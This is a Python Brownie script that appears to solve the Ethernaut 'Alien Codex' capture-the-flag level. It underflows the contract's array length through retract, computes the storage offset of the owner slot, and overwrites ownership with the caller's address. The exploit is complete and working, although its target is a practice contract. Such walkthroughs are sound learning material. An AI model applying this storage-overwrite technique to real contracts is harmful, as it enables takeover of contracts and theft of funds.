from brownie import web3

LEVEL_NAME = "19_alien_codex"
ABI_JSON_FILE_NAME = "lvl_19_alien_codex.json"

from scripts.helpful_scripts import (
    get_account,
    get_new_instance,
    submit_instance,
    get_contract_from_abi_json,
)


def get_level_contract():
    instance_address = get_new_instance(LEVEL_NAME)
    level_contract = get_contract_from_abi_json(
        "Instance", instance_address, ABI_JSON_FILE_NAME
    )
    return level_contract


def solve_level(level_contract):
    account = get_account()
    """
    print("Account address - " + account.address)
    for x in range(2):
        storage_slot = web3.eth.get_storage_at(level_contract.address, x)
        print(f"Slot {x}: " + web3.toHex(storage_slot))
    """
    tx = level_contract.make_contact({"from": account})
    tx = level_contract.retract({"from": account})
    # 32 byte long hex string
    codexStart = web3.keccak(
        hexstr="0x0000000000000000000000000000000000000000000000000000000000000001"
    )

    ownerOffset = web3.toHex(2 ** 256 - web3.toInt(codexStart))
    # print("codexStart " + str(web3.toHex(codexStart)))
    # print("ownerOffset " + str(ownerOffset))
    # codexStart 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
    # ownerOffset 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a

    tx = level_contract.revise(
        ownerOffset,
        account.address,
        {"from": account},
    )
    """
    for x in range(3):
        storage_slot = web3.eth.get_storage_at(level_contract.address, x)
        print(f"Slot {x}: " + web3.toHex(storage_slot))
    """


# brownie run scripts/_19_alien_codex.py --network rinkeby-fork
def main():
    level_contract = get_level_contract()
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    if level_solved:
        print("You have completed level -> " + LEVEL_NAME)
    else:
        print(f"Looks like you haven't cracked level {LEVEL_NAME} just yet!")
    return level_solved
